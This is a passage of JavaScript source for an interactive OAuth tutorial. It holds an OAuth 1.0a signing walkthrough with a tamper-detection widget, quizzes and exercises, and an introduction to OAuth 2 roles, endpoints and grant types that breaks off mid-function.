              { from: 'b', to: 's', label: 'Approve', msg: 'POST /authorize HTTP/1.1\nHost: photos.example.net\nContent-Type: application/x-www-form-urlencoded\n\noauth_token=' + RT + '&approve=yes',
                set: { s: { approved: RT + ' by jane' } } },
              { from: 's', to: 'b', kind: 'redirect', label: '302 → callback?oauth_token&oauth_verifier',
                msg: 'HTTP/1.1 302 Found\nLocation: ' + CB + '?oauth_token=' + RT + '&oauth_verifier=' + VER, hl: ['oauth_verifier=' + VER],
                note: 'The provider redirects back with <code>oauth_verifier</code>. The 1.0a fix: without the verifier, an attacker could start a flow, get a victim to approve the attacker\'s request token, and then finish the flow as the victim (session fixation).' },
              { from: 'b', to: 'c', label: 'GET /ready?oauth_token&oauth_verifier',
                msg: 'GET /ready?oauth_token=' + RT + '&oauth_verifier=' + VER + ' HTTP/1.1\nHost: printer.example.com',
                set: { c: { verifier: VER } } },
              { from: 'c', to: 's', kind: 'back', label: '③ POST /token (request token + verifier)', msg: r2.msg,
                hl: ['oauth_verifier', 'oauth_signature='],
                note: 'Leg 3: swap temporary credentials for <b>token credentials</b>. The signing key now includes the request token secret: <code>' + esc(r2.s.key) + '</code>.' },
              { from: 's', to: 'c', kind: 'back', label: '200 access oauth_token + secret',
                msg: 'HTTP/1.1 200 OK\nContent-Type: application/x-www-form-urlencoded\n\noauth_token=' + AT + '&oauth_token_secret=' + ATS,
                set: { c: { request_token: null, request_secret: null, verifier: null, access_token: AT, access_secret: ATS } },
                note: 'The app now holds the long-lived access token and its secret. The temporary credentials are thrown away.' },
              { from: 'c', to: 's', label: 'GET /photos (signed)', msg: r3.msg, hl: ['oauth_token="' + AT + '"', 'oauth_signature='],
                note: 'Every API call is signed with <code>' + esc(r3.s.key) + '</code>. The query params <code>file</code> and <code>size</code> are part of the signed base string.' },
              { from: 's', to: 's', label: 'verify signature + nonce/timestamp',
                note: 'The provider looks up the secrets for <code>' + CK + '</code> and <code>' + AT + '</code>, rebuilds the base string from the request it received, and compares signatures. It also rejects a reused <code>oauth_nonce</code> or an old <code>oauth_timestamp</code> (replay).' },
              { from: 's', to: 'c', kind: 'res', label: '200 image/jpeg',
                msg: 'HTTP/1.1 200 OK\nContent-Type: image/jpeg\nContent-Length: 482113\n\n<binary photo bytes>' },
            ],
          });
        }),
        explain: `
          <details>
            <summary>The problem it solved (in 2007, before HTTPS was everywhere)</summary>
            <p>Many APIs still ran over plain HTTP. Sending a secret, or even a bearer token, in every request would leak it to anyone on the
            café Wi-Fi. OAuth 1.0a's answer: <strong>never send secrets at all</strong>. Send only a signature that proves you know them, computed over
            the exact request, so it can't be reused for a different request or replayed later.</p>
          </details>
          <details>
            <summary>Step by step: what each message carries</summary>
            <table>
              <tr><th>Step</th><th>Message</th><th>Signed with key</th><th>App's state after</th></tr>
              <tr><td>2</td><td><code>POST /initiate</code> + <code>oauth_callback</code></td><td><code>consumer_secret&amp;</code></td><td>-</td></tr>
              <tr><td>3</td><td>200 <code>oauth_token</code>, <code>oauth_token_secret</code></td><td>-</td><td>request_token, request_secret</td></tr>
              <tr><td>4–8</td><td>Browser redirects: <code>/authorize?oauth_token</code> → approve → callback with <code>oauth_verifier</code></td><td>(not signed: browser)</td><td>+ verifier</td></tr>
              <tr><td>10</td><td><code>POST /token</code> + <code>oauth_token</code>, <code>oauth_verifier</code></td><td><code>consumer_secret&amp;request_secret</code></td><td>-</td></tr>
              <tr><td>11</td><td>200 access <code>oauth_token</code> + secret</td><td>-</td><td>access_token, access_secret</td></tr>
              <tr><td>12</td><td><code>GET /photos?file=…&amp;size=…</code></td><td><code>consumer_secret&amp;access_secret</code></td><td>-</td></tr>
              <tr><td>13</td><td>Server recomputes and compares</td><td colspan="2">same base string, same key, so same signature</td></tr>
            </table>
            <p>The grey <code>#</code> lines at the bottom of steps 2, 10 and 12 show the <em>actual</em> base string and key used to compute the
            <code>oauth_signature</code> in that message. A fresh nonce and the current timestamp are generated each time you load the widget (↺ Reset).</p>
          </details>
          <details>
            <summary>Key ideas</summary>
            <ul>
              <li><strong>Secrets never travel</strong> after registration. Only <code>oauth_token</code> (public) and the signature do.</li>
              <li><strong>Signing key = two secrets joined by <code>&amp;</code>.</strong> The consumer secret proves which app sent it; the token secret proves which user grant it uses.</li>
              <li><strong>The verifier</strong> ties the callback to the user who actually approved. It was the "a" fix in 1.0a.</li>
            </ul>
          </details>
          <details>
            <summary>Try this</summary>
            <ul>
              <li>Click step 2 and step 12 and compare the "signing key" comment lines. One has an empty half after <code>&amp;</code>.</li>
              <li>Press ↺ Reset and step to 12 again: the <code>oauth_nonce</code>, and therefore the signature, are different every time.</li>
              <li>Look at how often the <code>Authorization</code> header repeats: OAuth 2's <code>Bearer xyz</code> is much shorter.</li>
            </ul>
          </details>
        `,
      },
      {
        title: 'Signature base string builder (+ tamper test)',
        code: W1(`
<div class="grid2">
  <div class="card">
    <h4>Request</h4>
    <div class="row"><select id="method"><option>GET</option><option>POST</option></select>
      <input id="url" class="w" style="flex:1" value="http://photos.example.net/photos"></div>
    <label class="muted">Request params (query or form body), one <code>name=value</code> per line, <b>un-encoded</b>:</label>
    <textarea id="params" rows="2">file=vacation.jpg
size=original</textarea>
    <h4 style="margin-top:6px">oauth_* params</h4>
    <div class="mono" style="display:grid;grid-template-columns:auto 1fr;gap:2px 6px;align-items:center">
      <span>consumer_key</span><input id="ck" value="dpf43f3p2l4k3l03">
      <span>token</span><input id="tk" value="nnch734d00sl2jdk">
      <span>nonce</span><span class="row" style="gap:4px"><input id="nonce" value="chapoH" style="flex:1"><button id="newn">🎲</button></span>
      <span>timestamp</span><input id="ts" value="137131202">
    </div>
  </div>
  <div class="card">
    <h4>Secrets (never sent)</h4>
    <div class="mono" style="display:grid;grid-template-columns:auto 1fr;gap:2px 6px;align-items:center">
      <span>consumer_secret</span><input id="cs" value="kd94hf93k423kf44">
      <span>token_secret</span><input id="tsec" value="pfkkdhi9sl3r4s00">
    </div>
    <h4 style="margin-top:8px">🕵 Tamper test</h4>
    <p class="muted" style="margin:0">Pretend a man-in-the-middle changes the request <b>after</b> it was signed.</p>
    <label><input type="checkbox" id="tamper"> change <code>size=original</code> → <code>size=small</code> in transit</label>
    <div id="verdict" style="margin-top:6px"></div>
  </div>
</div>
<div class="card"><h4>How the signature is built</h4><table class="t mono" id="steps"></table></div>
`, function () {
          const ids = ['method', 'url', 'params', 'ck', 'tk', 'nonce', 'ts', 'cs', 'tsec', 'tamper'];
          function pairsFromText(t) {
            return t.split('\n').map((l) => l.trim()).filter(Boolean).map((l) => {
              const i = l.indexOf('=');
              return i < 0 ? [l, ''] : [l.slice(0, i), l.slice(i + 1)];
            });
          }
          function oauthPairs() {
            const p = [['oauth_consumer_key', $('#ck').value], ['oauth_nonce', $('#nonce').value],
              ['oauth_signature_method', 'HMAC-SHA256'], ['oauth_timestamp', $('#ts').value], ['oauth_version', '1.0']];
            if ($('#tk').value) p.push(['oauth_token', $('#tk').value]);
            return p;
          }
          function render() {
            let url;
            try { url = new URL($('#url').value); } catch (e) { $('#steps').innerHTML = '<tr><td class="bad">Invalid URL</td></tr>'; return; }
            const m = $('#method').value, req = pairsFromText($('#params').value), oa = oauthPairs();
            const all = req.concat(oa).concat(Array.from(url.searchParams.entries()));
            const encoded = all.map(([k, v]) => pct(k) + '=' + pct(v));
            const s = oauth1Sign(m, $('#url').value, req.concat(oa), $('#cs').value, $('#tsec').value);
            const rows = [
              ['1–2. Collect every param (query + body + oauth_*, not oauth_signature), percent-encode names and values (RFC 3986: space → %20, ! → %21)', encoded.join('   ')],
              ['3. Sort by name, then join with &', s.norm],
              ['4. Base string = METHOD & enc(base URL) & enc(step 3)', '<b>' + esc(m) + '</b>&amp;<b>' + esc(pct(baseUri($('#url').value))) + '</b>&amp;' + esc(pct(s.norm))],
              ['5. Signing key = enc(consumer_secret) & enc(token_secret)', s.key],
              ['6. oauth_signature = base64(HMAC-SHA256(key, base))', s.sig],
              ['7. Authorization header', authHeader(oa, s.sig)],
            ];
            $('#steps').innerHTML = rows.map((r, i) => '<tr><td style="width:34%;font-family:system-ui">' + esc(r[0]) +
              '</td><td style="white-space:pre-wrap;overflow-wrap:anywhere">' + (i === 2 ? r[1] : esc(r[1])) + '</td></tr>').join('');
            // server side verification
            let recv = req.map((p) => p.slice());
            const t = $('#tamper').checked;
            if (t) recv = recv.map(([k, v]) => (k === 'size' ? [k, 'small'] : [k, v]));
            const srv = oauth1Sign(m, $('#url').value, recv.concat(oa), $('#cs').value, $('#tsec').value);
            const ok = srv.sig === s.sig;
            $('#verdict').innerHTML = '<div class="mono">sent signature: ' + esc(s.sig) + '<br>server recomputes: ' + esc(srv.sig) + '</div>' +
              (ok ? '<span class="pill g">200 OK: signatures match</span>'
                : '<span class="pill r">401 Unauthorized: signature mismatch</span> <span class="muted">(the server rebuilt the base string from <code>size=small</code>)</span>');
          }
          ids.forEach((id) => { $('#' + id).oninput = render; $('#' + id).onchange = render; });
          $('#newn').onclick = () => { $('#nonce').value = Auth.randHex(8); $('#ts').value = String(Math.floor(Date.now() / 1000)); render(); };
          render();
        }, `.grid2 .card { margin: 0 } #steps td { padding: 3px 6px; font-size: 12px; }`),
        explain: `
          <details>
            <summary>Step by step: the rows in the table</summary>
            <table>
              <tr><th>Row</th><th>What happens</th><th>Typical bug</th></tr>
              <tr><td>1–2</td><td>Collect query params, form-body params and all <code>oauth_*</code> params except the signature</td><td>Forgetting query params that are part of the URL</td></tr>
              <tr><td>1–2</td><td>…then percent-encode names and values per RFC 3986</td><td>Using <code>+</code> for space, or not encoding <code>!*'()</code></td></tr>
              <tr><td>3</td><td>Sort by encoded name (then by value), join <code>k=v</code> with <code>&amp;</code></td><td>Sorting before encoding</td></tr>
              <tr><td>4</td><td>Uppercase method, base URL (lowercase host, no default port, no query), and step 3, each encoded <em>again</em> and joined with <code>&amp;</code></td><td>Not double-encoding: <code>%20</code> must become <code>%2520</code></td></tr>
              <tr><td>5</td><td><code>enc(consumer_secret)&amp;enc(token_secret)</code></td><td>Dropping the <code>&amp;</code> when there is no token yet</td></tr>
              <tr><td>6</td><td>HMAC over the base string, then base64. (The spec uses SHA1; this demo uses SHA-256.)</td><td>Hex instead of base64</td></tr>
              <tr><td>7</td><td>Put everything into <code>Authorization: OAuth …</code> with each value encoded and quoted</td><td>Not encoding <code>/ + =</code> in the signature</td></tr>
            </table>
          </details>
          <details>
            <summary>Try this</summary>
            <ul>
              <li>Add a line <code>caption=Hello World!</code> to the params. In row 1–2 the space becomes <code>%20</code> and <code>!</code> becomes <code>%21</code>. In row 4 they become <code>%2520</code> and <code>%2521</code> (double-encoded).</li>
              <li>Clear the <b>token_secret</b>. Row 5 still ends with <code>&amp;</code>.</li>
              <li>Tick the <b>tamper</b> box: the server's recomputed signature differs, so 401.</li>
              <li>Click 🎲: a new nonce/timestamp changes the signature completely, which is how replays are prevented.</li>
              <li>Change the URL to <code>http://PHOTOS.example.net:80/photos</code>: row 4 is unchanged (host lowercased, default port dropped).</li>
            </ul>
          </details>
        `,
      },
    ],
    quiz: [
      { q: 'What is the HMAC signing key for an OAuth 1.0a API call?',
        options: ['The access token', 'enc(consumer_secret) + "&" + enc(token_secret)', 'The user\'s password', 'consumer_key:consumer_secret in base64'],
        answer: 1, why: 'Both secrets are joined with &. During the first (request-token) step there is no token secret yet, so the key is just "consumer_secret&".' },
      { q: 'Why must parameters be percent-encoded and sorted before signing?',
        options: ['To make the URL shorter', 'So client and server build a byte-identical base string and get the same signature', 'To encrypt them', 'Because HTTP requires sorted parameters'],
        answer: 1, why: 'HMAC changes completely if a single byte differs. A precise normalization rule is the only way both sides sign the same bytes.' },
      { q: 'What do <code>oauth_nonce</code> and <code>oauth_timestamp</code> protect against?',
        options: ['Tampering', 'Replay of a captured request', 'Phishing', 'Expired passwords'],
        answer: 1, why: 'The server remembers recent nonces and rejects old timestamps, so the same signed request cannot be sent twice.' },
      { q: 'What did <code>oauth_verifier</code> (the "a" in 1.0a) fix?',
        options: ['Slow signatures', 'A session-fixation attack where an attacker could finish a flow that a victim approved', 'Missing HTTPS', 'Token expiry'],
        answer: 1, why: 'Only the browser that actually went through approval receives the verifier, so an attacker who started the flow can\'t complete it with the victim\'s approval.' },
      { q: 'Main reason OAuth 2 dropped request signatures?',
        options: ['Signatures were broken by quantum computers', 'Signing was hard to implement correctly; HTTPS now protects tokens in transit', 'Signatures are illegal', 'OAuth 2 encrypts tokens instead'],
        answer: 1, why: 'Getting every encoding detail right was a constant source of bugs. OAuth 2 relies on TLS and uses bearer tokens (with optional proof-of-possession via DPoP or mTLS).' },
    ],
    exercise: {
      task: `<p>Build the OAuth 1.0a <strong>signature base string</strong> by hand. Type the normalized parameter string and the
        full base string in the boxes below and click <strong>Check</strong>. Once both are right, the widget signs it for you.</p>`,
      hint: 'Encode first (space → %20, ! → %21), sort by name, join with &. For the base string, encode the URL and the whole parameter string once more: = becomes %3D, & becomes %26, and %20 becomes %2520.',
      starter: W1(`<div id="ex"></div>`, exOauth1, '', { fill: false }),
      solution: W1(`<div id="ex"></div>`, exOauth1, '', { fill: true }),
    },
  });

  function exOauth1() {
    const P = [['size', 'original'], ['file', 'vacation 2026.jpg'], ['oauth_consumer_key', 'dpf43f3p2l4k3l03'],
      ['oauth_token', 'nnch734d00sl2jdk'], ['oauth_signature_method', 'HMAC-SHA256'], ['oauth_timestamp', '1767225600'],
      ['oauth_nonce', 'n0nce!'], ['oauth_version', '1.0']];
    const URL_ = 'https://photos.example.net/photos';
    const norm = normParams(P);
    const base = 'GET&' + pct(URL_) + '&' + pct(norm);
    $('#ex').innerHTML = '<div class="card"><b>Request:</b> <code>GET ' + URL_ + '</code><br><b>Params (raw):</b>' +
      '<table class="t mono" style="margin-top:4px">' + P.map((p) => '<tr><td>' + p[0] + '</td><td>' + esc(p[1]) + '</td></tr>').join('') + '</table>' +
      '<p class="muted" style="margin:6px 0 0">consumer_secret = <code>kd94hf93k423kf44</code>, token_secret = <code>pfkkdhi9sl3r4s00</code></p></div>' +
      '<label>① Normalized parameter string (encoded, sorted, joined with &amp;):</label><textarea id="a1" rows="3"></textarea>' +
      '<label>② Signature base string (METHOD&amp;enc(URL)&amp;enc(①)):</label><textarea id="a2" rows="4"></textarea>' +
      '<button class="primary" id="chk">Check</button><div class="fb" id="fb"></div>';
    if (DATA.fill) { $('#a1').value = norm; $('#a2').value = base; }
    $('#chk').onclick = () => {
      const a1 = $('#a1').value.trim(), a2 = $('#a2').value.trim();
      const tips = [];
      if (a1 !== norm) {
        if (/\+/.test(a1) || / /.test(a1)) tips.push('Spaces must be <code>%20</code> (not <code>+</code> or a raw space).');
        if (/n0nce!/.test(a1)) tips.push('<code>!</code> is reserved in RFC 3986 → <code>%21</code>.');
        if (!/^file=/.test(a1)) tips.push('Sort by name: <code>file</code> comes first, <code>size</code> last.');
        tips.push('① should be ' + norm.length + ' characters; yours is ' + a1.length + '.');
        return feedback($('#fb'), false, '❌ ① is not right yet.<ul><li>' + tips.join('</li><li>') + '</li></ul>');
      }
      if (a2 !== base) {
        if (!/^GET&/.test(a2)) tips.push('Start with the uppercase method and <code>&amp;</code>: <code>GET&amp;</code>.');
        if (/https:\/\//.test(a2)) tips.push('Encode the URL: <code>https%3A%2F%2Fphotos.example.net%2Fphotos</code>.');
        if (/%20/.test(a2) && !/%2520/.test(a2)) tips.push('Double-encode: <code>%20</code> inside ① becomes <code>%2520</code>.');
        if (/file=/.test(a2)) tips.push('Encode ① too: <code>=</code> → <code>%3D</code>, <code>&amp;</code> → <code>%26</code>.');
        return feedback($('#fb'), false, '❌ ① is correct, ② is not yet.<ul><li>' + (tips.join('</li><li>') || 'Compare carefully, character by character.') + '</li></ul>');
      }
      const sig = Auth.hmacSha256b64('kd94hf93k423kf44&pfkkdhi9sl3r4s00', base);
      feedback($('#fb'), true, '✅ Both correct! Signing key <code>kd94hf93k423kf44&amp;pfkkdhi9sl3r4s00</code> gives<br><code>oauth_signature="' + esc(pct(sig)) + '"</code> (HMAC-SHA256, base64, then percent-encoded for the header).');
    };
  }

  // ───────────────────────────── 3. oauth2-roles ─────────────────────────────
  L.push({
    id: 'oauth2-roles',
    section: SECTION,
    title: 'OAuth 2: roles, endpoints & grants',
    explain: `
      <p><strong>OAuth 2.0</strong> is defined in <strong>RFC 6749</strong> (2012), with bearer token usage in <strong>RFC 6750</strong>.
      It is less a single protocol than a framework: a few roles, a few endpoints, and several <em>grant types</em> (ways to get a token).</p>
      <h3>The four roles (hotel analogy)</h3>
      <table>
        <tr><th>Role</th><th>Who in our example</th><th>Hotel analogy</th></tr>
        <tr><td><strong>Resource owner</strong></td><td>Alice, the user</td><td>The guest who booked the room</td></tr>
        <tr><td><strong>Client</strong></td><td>PrintApp, the app that wants access</td><td>A cleaner the guest lets into the room</td></tr>
        <tr><td><strong>Authorization server (AS)</strong></td><td><code>accounts.megacorp.example</code></td><td>The front desk that programs key cards</td></tr>
        <tr><td><strong>Resource server (RS)</strong></td><td><code>api.megacorp.example</code> (the photos API)</td><td>The room door that reads key cards</td></tr>
      </table>
      <p>The AS and RS are often run by the same company, and can even be the same server; they are <em>roles</em>, not machines.
      Products like Auth0, Okta, Keycloak, Microsoft Entra ID or AWS Cognito play the AS role for your own APIs.</p>
      <h3>Endpoints</h3>
      <ul>
        <li><strong>Authorization endpoint</strong> (<code>GET /authorize</code>, on the AS): the <em>browser</em> is sent here. The user logs in and consents.</li>
        <li><strong>Token endpoint</strong> (<code>POST /token</code>, on the AS): the client calls it <em>directly</em> to get tokens. The body is always <code>application/x-www-form-urlencoded</code> and the response is JSON.</li>
        <li><strong>Redirection endpoint</strong> (e.g. <code>https://printapp.example/callback</code>, on the client): where the AS sends the browser back. It must be pre-registered.</li>
        <li>Extras you'll meet later: <code>/introspect</code> (RFC 7662), <code>/revoke</code> (RFC 7009), <code>/device_authorization</code> (RFC 8628) and the discovery document <code>/.well-known/oauth-authorization-server</code> (RFC 8414).</li>
      </ul>
      <h3>Front-channel vs back-channel</h3>
      <p><strong>Front-channel</strong> means the message rides through the user's browser as a redirect URL. That is convenient,
      but the browser, its history, extensions and the user can all see it, and an attacker can craft it. <strong>Back-channel</strong> means a direct
      HTTPS call from client to server (server-to-server), which nobody in the middle can read or change. A core OAuth design idea: <em>only send
      low-value, one-time things (like a <code>code</code>) through the front channel, and get the real token through the back channel.</em></p>
      <h3>Client types</h3>
      <ul>
        <li><strong>Confidential client</strong>: runs on a server you control and can keep a secret (a <code>client_secret</code> or a private key). Examples: a server-rendered web app, a BFF, a backend job.</li>
        <li><strong>Public client</strong>: runs on the user's device, so any "secret" in it can be extracted. Examples: a single-page app, a mobile or desktop app, a TV app. These are identified by <code>client_id</code> only, and PKCE protects them.</li>
      </ul>
      <h3>Grant types today (2026)</h3>
      <pre><code class="language-http">authorization_code (+ PKCE)          user + browser: web apps, SPAs, mobile   ✅ the default
client_credentials                   no user: service-to-service              ✅
urn:ietf:params:oauth:grant-type:device_code   TVs, CLIs, IoT                 ✅ RFC 8628
refresh_token                        renew an access token                    ✅
implicit  (response_type=token)      old SPAs                                 ❌ removed in OAuth 2.1
password  (ROPC)                     app collects the password                ❌ removed in OAuth 2.1</code></pre>
      <div class="tip"><strong>OAuth 2.1</strong> is still an IETF <em>draft</em> in 2026. It folds RFC 6749 + 6750 together with the
      security best practice of <strong>RFC 9700</strong> (published January 2025): PKCE for everyone, exact redirect URI matching,
      no implicit, no password grant.</div>
    `,
    examples: [
      {
        title: 'Who talks to whom: roles and channels',
        code: W(`<div id="flow"></div>`, function () {
          Seq.mount('#flow', {
            title: 'The four roles in one OAuth 2 flow',
            intro: 'Orange dashed = <b>front-channel</b> (through the browser). Cyan dotted = <b>back-channel</b> (direct). Press <b>Next ▶</b>.',
            actors: [
              { id: 'ro', label: 'Resource owner', icon: '🧑', store: { who: 'Alice + her browser' } },
              { id: 'c', label: 'Client', icon: '🖨', store: { client_id: 'printapp', type: 'confidential' } },
              { id: 'as', label: 'Authorization server', icon: '🛂', store: { issues: 'tokens' } },
              { id: 'rs', label: 'Resource server', icon: '🗄', store: { holds: "Alice's photos" } },
            ],
            steps: [
              { from: 'c', to: 'ro', kind: 'redirect', badge: 'front-channel', label: 'go ask the AS',
                msg: 'HTTP/1.1 302 Found\nLocation: https://accounts.megacorp.example/authorize?response_type=code&client_id=printapp&...',
                note: 'The <b>client</b> can\'t talk to Alice directly, so it redirects her <b>browser</b> to the AS\'s <b>authorization endpoint</b>.' },
              { from: 'ro', to: 'as', badge: 'front-channel', label: 'GET /authorize',
                msg: 'GET /authorize?response_type=code&client_id=printapp&redirect_uri=...&scope=photos.read&state=... HTTP/1.1\nHost: accounts.megacorp.example',
                note: 'Everything here is visible in the address bar, so no secrets.' },
              { from: 'as', to: 'ro', kind: 'res', label: 'login + consent', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n# "PrintApp wants to view your photos"',
                note: 'The <b>resource owner</b> authenticates <em>to the AS</em> and approves.' },
              { from: 'as', to: 'ro', kind: 'redirect', badge: 'front-channel', label: '302 → redirect_uri?code=…',
                msg: 'HTTP/1.1 302 Found\nLocation: https://printapp.example/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=...',
                note: 'The AS sends the browser back to the client\'s <b>redirection endpoint</b> with a short-lived, single-use <code>code</code>.' },
              { from: 'ro', to: 'c', badge: 'front-channel', label: 'GET /callback?code=…', msg: 'GET /callback?code=SplxlOBeZQQYbYS6WxSbIA&state=... HTTP/1.1\nHost: printapp.example',
                set: { c: { code: 'SplxlOBe…' } } },
              { from: 'c', to: 'as', kind: 'back', label: 'POST /token', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nAuthorization: Basic cHJpbnRhcHA6czNjcjN0\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA&redirect_uri=https%3A%2F%2Fprintapp.example%2Fcallback',
                note: '<b>Back-channel</b>: the client calls the <b>token endpoint</b> directly and authenticates itself (here with its client secret).' },
              { from: 'as', to: 'c', kind: 'back', label: '200 {access_token…}', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: no-store\n\n{"access_token":"2YotnFZFEjr1zCsicMWpAA","token_type":"Bearer","expires_in":3600}',
                set: { c: { code: null, access_token: '2YotnFZF… (1h)' } }, note: 'The real token never touched the browser.' },
              { from: 'c', to: 'rs', label: 'GET /photos  Bearer …', msg: 'GET /v1/photos HTTP/1.1\nHost: api.megacorp.example\nAuthorization: Bearer 2YotnFZFEjr1zCsicMWpAA', hl: ['Bearer'],
                note: 'The client presents the token to the <b>resource server</b> (RFC 6750 bearer usage).' },
              { from: 'rs', to: 'rs', label: 'validate token (sig/introspect, exp, scope)', note: 'The RS trusts tokens issued by the AS. It checks them locally (JWT signature) or asks the AS (introspection).' },
              { from: 'rs', to: 'c', kind: 'res', label: '200 photos', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n[{"id":"p1"},{"id":"p2"}]' },
            ],
          });
        }),
      },
      {
        title: 'Grant picker: which flow should my app use?',
        code: W(`
<div class="grid2">
  <div class="card">
    <h4>1. Is a human user involved?</h4>
    <label><input type="radio" name="u" value="yes" checked> Yes, the app acts on behalf of a user</label><br>
    <label><input type="radio" name="u" value="no"> No, a service acts as itself (cron job, microservice)</label>
    <div id="q2">
      <h4 style="margin-top:10px">2. What kind of app is it?</h4>
      <select id="kind" class="w">
        <option value="web">Server-rendered web app (Express, Django, Rails, Spring)</option>
        <option value="bff">SPA + its own backend (BFF) that holds the tokens</option>
        <option value="spa">SPA with no backend (tokens live in JavaScript)</option>
        <option value="native">Native mobile / desktop app</option>
        <option value="device">TV / console / CLI / IoT (no browser or awkward keyboard)</option>
      </select>
    </div>
  </div>
  <div class="card" id="out"></div>
</div>
<div class="card"><h4>Endpoints this grant uses</h4><div id="eps" class="row"></div></div>
`, function () {
          const R = {
            web: { g: 'Authorization Code + PKCE', gt: 'authorization_code', type: 'Confidential', auth: 'client_secret_basic or private_key_jwt',
              why: 'Tokens stay on your server. The browser only ever sees the one-time code.', eps: ['/authorize', '/token', 'redirect_uri'], front: true },
            bff: { g: 'Authorization Code + PKCE (the BFF is the client)', gt: 'authorization_code', type: 'Confidential', auth: 'client_secret_basic or private_key_jwt',
              why: 'The BFF does the flow and keeps tokens server-side. The SPA gets an HttpOnly session cookie. Recommended for browser apps that handle sensitive data.', eps: ['/authorize', '/token', 'redirect_uri'], front: true },
            spa: { g: 'Authorization Code + PKCE', gt: 'authorization_code', type: 'Public', auth: 'none (client_id only)',
              why: 'No secret is possible in the browser; PKCE protects the code. Keep access tokens short-lived; refresh tokens must rotate or be sender-constrained.', eps: ['/authorize', '/token', 'redirect_uri'], front: true },
            native: { g: 'Authorization Code + PKCE (system browser)', gt: 'authorization_code', type: 'Public', auth: 'none (client_id only)',
              why: 'RFC 8252: open the system browser, not an embedded WebView. Redirect back via a claimed https link or a private-use scheme like com.printapp:/cb.', eps: ['/authorize', '/token', 'redirect_uri'], front: true },
            device: { g: 'Device Authorization Grant', gt: 'urn:ietf:params:oauth:grant-type:device_code', type: 'Public (usually)', auth: 'none (client_id only)',
              why: 'RFC 8628: the device shows a short code, the user approves on their phone, and the device polls /token.', eps: ['/device_authorization', '/token'], front: false },
            m2m: { g: 'Client Credentials', gt: 'client_credentials', type: 'Confidential', auth: 'client_secret_basic, private_key_jwt or mTLS',
              why: 'No user means no browser and no consent. The service authenticates as itself and gets a token for its own permissions.', eps: ['/token'], front: false },
          };
          const ALL = ['/authorize', '/device_authorization', '/token', 'redirect_uri'];
          function render() {
            const u = document.querySelector('input[name=u]:checked').value;
            $('#q2').style.display = u === 'yes' ? '' : 'none';
            const r = R[u === 'no' ? 'm2m' : $('#kind').value];
            $('#out').innerHTML = '<h4>Recommended</h4><div style="font-size:18px;font-weight:700;color:#087ea4">' + r.g + '</div>' +
              '<table class="t" style="margin-top:6px"><tr><th>grant_type</th><td><code>' + r.gt + '</code></td></tr>' +
              '<tr><th>Client type</th><td>' + r.type + '</td></tr><tr><th>Client auth at /token</th><td>' + r.auth + '</td></tr>' +
              '<tr><th>Front-channel?</th><td>' + (r.front ? 'yes (browser redirects)' : 'no') + '</td></tr></table>' +
              '<p style="margin:6px 0">' + r.why + '</p>' +
              '<p class="muted" style="margin:0">❌ Not recommended for any case: <s>implicit</s>, <s>password (ROPC)</s>.</p>';
            $('#eps').innerHTML = ALL.map((e) => '<span class="pill ' + (r.eps.includes(e) ? 'b' : '') + '" style="' +
              (r.eps.includes(e) ? '' : 'background:#f1f3f7;color:#a0a6b8') + '">' + e + '</span>').join('');
          }
          $$('input[name=u]').forEach((x) => (x.onchange = render));
          $('#kind').onchange = render;
          render();
        }, `.grid2 .card { margin: 0 } .grid2 { margin-bottom: 10px }`),
      },
    ],
    quiz: [
      { q: 'Which role <strong>issues</strong> access tokens?',
        options: ['Resource server', 'Client', 'Authorization server', 'Resource owner'],
        answer: 2, why: 'The authorization server authenticates the user, gets consent and issues tokens. The resource server only accepts them.' },
      { q: '"Front-channel" means the message…',
        options: ['is encrypted twice', 'travels through the user\'s browser as a redirect URL, where it can be seen or tampered with', 'is sent server-to-server', 'is sent over UDP'],
        answer: 1, why: 'Front-channel messages ride in redirect URLs, visible to the browser, its history and extensions. That is why only a short-lived code goes there.' },
      { q: 'A React SPA with no backend is which client type?',
        options: ['Confidential', 'Public', 'Trusted', 'First-party, so no OAuth needed'],
        answer: 1, why: 'Anything shipped to the browser can be read by the user, so it cannot keep a client secret. It is a public client and relies on PKCE.' },
      { q: 'What does a request to the token endpoint look like?',
        options: ['GET with params in the query string', 'POST with an application/x-www-form-urlencoded body, JSON response', 'POST with a JSON body, XML response', 'A browser redirect'],
        answer: 1, why: 'RFC 6749 §3.2: the client uses POST with form-encoded parameters; the AS responds with JSON (and Cache-Control: no-store).' },
      { q: 'Which grant is right for a nightly job that syncs invoices between two of your own services?',
        options: ['Authorization Code + PKCE', 'Device Authorization', 'Client Credentials', 'Implicit'],
        answer: 2, why: 'No user is involved, so the service authenticates as itself with client_credentials.' },
    ],
    exercise: {
      task: `<p>For each app below, pick the <strong>grant</strong> and the <strong>client type</strong> in the box below, then click <strong>Check</strong>.</p>`,
      hint: 'First ask: is there a user? Then: can the code keep a secret (does it run on your server)? Then: does the device have a usable browser?',
      starter: W(`<div id="ex"></div>`, exGrants, '', { fill: false }),
      solution: W(`<div id="ex"></div>`, exGrants, '', { fill: true }),
    },
  });

  function exGrants() {
    const G = ['Authorization Code + PKCE', 'Client Credentials', 'Device Authorization', 'Implicit', 'Password (ROPC)'];
    const Q = [
      ['A nightly billing job calls the Invoices API', 1, 'confidential'],
      ['A React SPA hosted on a CDN, no backend', 0, 'public'],
      ['A smart-TV streaming app', 2, 'public'],
      ['An iOS banking app', 0, 'public'],
      ['A server-rendered Django website', 0, 'confidential'],
    ];
    $('#ex').innerHTML = '<table class="t"><tr><th>App</th><th>Grant</th><th>Client type</th></tr>' + Q.map((q, i) =>
      '<tr><td>' + q[0] + '</td><td><select id="g' + i + '"><option value="">choose…</option>' +
      G.map((g, j) => '<option value="' + j + '">' + g + '</option>').join('') + '</select></td><td><select id="t' + i + '">' +
      '<option value="">choose…</option><option>confidential</option><option>public</option></select></td></tr>').join('') +
      '</table><button class="primary" id="chk" style="margin-top:8px">Check</button><div class="fb" id="fb"></div>';
    if (DATA.fill) Q.forEach((q, i) => { $('#g' + i).value = String(q[1]); $('#t' + i).value = q[2]; });
    $('#chk').onclick = () => {
      const errs = [];
      Q.forEach((q, i) => {
        const g = $('#g' + i).value, t = $('#t' + i).value;
